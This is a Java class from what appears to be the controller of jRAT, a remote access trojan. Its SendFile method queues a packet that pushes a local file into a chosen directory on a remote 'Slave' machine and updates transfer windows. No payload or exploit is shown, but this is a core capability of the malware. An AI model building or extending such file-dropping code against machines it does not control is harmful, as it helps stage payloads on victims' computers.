package io.jrat.client;

import io.jrat.client.packets.outgoing.Packet42TakeFile;
import io.jrat.client.ui.frames.FrameFileTransfer;
import io.jrat.client.ui.frames.FrameRemoteFiles;

import java.io.File;


public class SendFile {

	public static void sendFile(Slave slave, String file, String destdir) {
		sendFile(slave, new File(file), destdir);
	}

	public static void sendFile(final Slave slave, final File file, String destdir) {
		final FrameFileTransfer frame = FrameFileTransfer.instance;
		final FrameRemoteFiles frame2 = FrameRemoteFiles.instances.get(slave);

		if (frame2 != null) {
			frame2.start();
		}

		try {
			slave.addToSendQueue(new Packet42TakeFile(destdir, file.getName(), file));

			if (frame != null) {
				frame.done(file.getAbsolutePath(), file.length() + "");
			}
			if (frame2 != null) {
				frame2.done();
			}

		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

}
